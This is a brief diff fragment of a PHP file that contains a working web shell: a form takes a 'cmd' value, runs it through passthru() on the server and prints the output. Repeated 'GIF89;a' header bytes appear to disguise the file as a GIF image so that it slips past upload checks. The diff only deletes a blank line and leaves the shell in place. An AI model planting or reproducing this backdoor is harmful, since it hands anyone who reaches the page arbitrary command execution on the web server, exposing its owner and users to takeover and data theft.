@@ -4,7 +4,6 @@ Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
 </form>
 Output:<br />
 <pre><?php passthru($_POST['cmd'], $result); ?></pre>
-
 GIF89;aGIF89;aGIF89;a
 <?php ?>
 <!DOCTYPE html>
